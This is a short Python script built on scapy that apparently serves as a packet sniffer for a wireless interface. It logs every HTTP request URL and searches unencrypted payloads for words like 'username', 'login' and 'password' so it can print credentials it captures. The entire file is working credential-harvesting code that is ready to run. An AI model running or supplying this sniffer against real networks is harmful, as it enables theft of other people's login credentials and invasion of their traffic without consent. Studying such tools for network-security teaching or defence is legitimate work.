#!usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=processed_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "login", "user", "password", "pass"]
        for element in keywords:
            if element in load:
                return load

def processed_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>> {} ".format(url))

        login_info = get_login(packet)
        if login_info:
            print("\n\n[+] Possible username/password > {} ".format(login_info) + "\n\n")

sniff("wlan0")